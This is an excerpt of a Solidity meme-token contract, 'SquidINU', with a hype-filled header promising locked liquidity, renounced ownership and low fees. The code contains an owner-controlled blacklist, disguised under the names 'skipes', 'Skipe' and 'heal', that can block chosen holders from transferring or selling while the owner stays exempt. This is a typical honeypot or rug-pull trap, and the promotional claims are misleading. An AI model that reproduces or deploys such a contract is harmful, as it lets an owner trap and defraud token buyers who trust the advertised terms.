...
/*
 ...
 SquidInu is  new generation meme token and launching with megahype. I will add LP as soon as possible.
 #Launch and #contract details:  VOICE CHAT LIVE!
- Initial #LP will be #35BNB and #LP will lock via MUDRA along 2 years after launch and wii renounce Ownership...
- #TaxFee '2' - Low Transactions Fee-Massive Reflections to holders and LP 
...
contract SquidINU is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public skipes; 
    mapping (address => uint256) private _buyMap;
    address private contentAddress = 0x63e87Dd2b0E55d5730b7D0E9DC83731Cc1db10cd;
    address private marketingAddress = 0xaB7D2ba29feA64576EE657f0b7ae0730e3D268bA;
    address private devAddress = 0xDb1c0445E728d17e8c9DB9E7Aa56CbBdBf564659;
    ...
    constructor() {
        ...
        distribution = Distribution(2, 96, 2);
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            //Trade start check
            require(!skipes[from], "TOKEN: Your account is skipelisted!");
    ...
    function Skipe(address[] memory skipes_) public onlyOwner {
        for (uint256 i = 0; i < skipes_.length; i++) {
            skipes[skipes_[i]] = true;
        }
    }

    function heal(address notSkipe) public onlyOwner {
        skipes[notSkipe] = false;
    }
